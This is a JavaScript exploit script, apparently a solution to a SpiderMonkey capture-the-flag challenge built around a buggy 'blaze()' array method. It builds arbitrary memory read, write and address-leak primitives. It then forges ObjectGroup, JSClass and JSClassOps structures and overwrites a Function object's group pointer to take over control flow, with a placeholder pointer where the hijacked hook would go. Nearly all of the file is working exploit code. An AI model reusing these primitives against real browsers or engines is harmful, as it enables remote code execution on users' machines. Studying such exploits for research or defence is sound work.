load('/root/utils.js')
load('/root/int64.js')

// This will be our weird machine / exploitation primitives
class Weird {
	constructor(originalBackingBuffer) {
		this.originalBackingBuffer = originalBackingBuffer;
	}

	read(addr, length) {
		if (length == undefined) {
			throw '[-] No length provided for read!';
		}
		blazed[magicIndex] = new Int64(addr).asDouble();
		blazed[magicIndex - 2] = length;
		var data = targetArray.slice(0, length);
		this.restore();
		return data;
	}

	write(addr, value) {
		if (value == undefined) {
			throw 'No value provided for write';
		}
		print('[*] About to write ' + value + ' to address ' + addr);
		blazed[magicIndex] = new Int64(addr).asDouble();
		var values = value.bytes();
		targetArray.set(values);
		this.restore();
	}

	// Place the object's address at the first element of
	// the target array. Then read the array to get the address
	addrOf(obj) {
		blazed[magicIndex + 1] = obj;	// first element of targetAddress
		var addr = new Int64(targetArray.slice(0, 8));
		return addr;
	}

	restore() {
		blazed[magicIndex] = this.originalBackingBuffer;
		blazed[magicIndex - 2] = 8;
	}
}


const blazed = new Array(1,2,3,4,5,6);
const targetArray = new Uint8Array(8);

var blazedFirstElementAddr = objectAddress(blazed);
print('[*] Blazed is at: ' + blazedFirstElementAddr);
blazedFirstElementAddr = new Int64().assignAdd(blazedFirstElementAddr, 0x30);

var targetAddress = objectAddress(targetArray);
print('[*] Target array is at: ' + targetAddress);
targetAddress = new Int64().assignAdd(targetAddress, 0x38);
print("[*] Target array's buffer will be at: " + targetAddress.toString());

// This should always be 13!
var magicIndex = parseInt(new Int64().assignSub(targetAddress, blazedFirstElementAddr).toString()) / 8;
print("[*] Magic index is: " + magicIndex);

// Smoke weed everyday...
blazed.blaze();
// Initialise this with targetArray's original backing buffer
const weird = new Weird(blazed[magicIndex]);

// The memory layout we are looking at is this, when obj is at 0x3ca4b65c3040
// 0x3ca4b65c3040: 0x00003ca4b65c14f0	# 0x00003ca4b65c14f0 0x0000555558d06de8  →  0x0000555557b09710  →  "Function"
// 0x3ca4b65c3048: 0x00003ca4b6591218	# 0x00003ca4b6591218 0x00003ca4b6590180  →  0x0000555558d06de8  →  0x0000555557b09710  →  "Function"
// Where 0x555558d06de8 is the object group and 0x555557b09710 is the JSClass
// The object group is r-- located at .data.rel.ro but its pointer (0x3ca4b65c14f0) is rw-
// We will use this to point to a new object group in a writable location
obj = new Function(); 
taggedAddrOfObj = weird.addrOf(obj);
print("[*] Function object at: " + taggedAddrOfObj.toString(16));
addrOfObj = "0x" + taggedAddrOfObj.toString(16).substr(6);

// Read the first DWORD at *objectAddress*; this is a pointer 
// to its object group, a.k.a. object.groupRaw()
objectGroup = new Int64(weird.read(addrOfObj, 8));
print("[*] Object group is at: " + objectGroup.toString(16));
// objectGroup has a pointer to JSClass
jsClass = new Int64(weird.read(objectGroup, 8));
print("[*] JSClass is at: " + jsClass.toString(16));
// jsClass has a pointer to JSClassOps at offset 0x10
jsClassOps = new Int64().assignAdd(jsClass, 0x10);
jsClassOps = new Int64(weird.read(jsClassOps, 8));
print("[*] JSClassOps is at: " + jsClassOps.toString(16));

// We'll reconstruct the poisoned object's group in this array
// sizeof('js::ObjectGroup') == 0x30
// sizeof(JSClass) == 0x30
// sizeof(JSClassOps) == 0x58
fake = new Uint8Array(0x30 + 0x30 + 0x58);
// We're only interested in the region of memory that holds our
// data structures. The 7th word from Uint8Array is a pointer
// to its backing buffer, which we read here
taggedAddrOfFake = weird.addrOf(fake);
addrOfFake = "0x" + taggedAddrOfFake.toString(16).substr(6);
addrOfFake = new Int64().assignAdd(addrOfFake, 7 * 8);
addrOfFake = new Int64(weird.read(addrOfFake, 8));
print("[*] Fake data structures is at: " + addrOfFake.toString(16));
// Copy entire ObjectGroup
fake.set(weird.read(objectGroup, 0x30));
// Copy entire JSFunction
fake.set(weird.read(jsClass, 0x30), 0x30);
// Copy entire JSClassOps
fake.set(weird.read(jsClassOps, 0x58), 0x60);

// At this point we've copied all the data structures we need, now we need to link them
// 1. Make the fake object group point to the fake JSClass - that is: make fake[0] point to fake[6]
fake.set(new Int64().assignAdd(addrOfFake, 0x30).bytes());
// 2. Make the fake JSClass point to the fake JSClassOps - that is: make fake[8] point to fake[10]
fake.set(new Int64().assignAdd(addrOfFake, 0x60).bytes(), 0x40);

fake.set(new Int64(0xcafebabecafebabe).bytes() , 0x60);

// All set, let's poison the object by making it point to our object group
weird.write(addrOfObj, addrOfFake);

//obj.lostMyWalletInElSegundo = 1
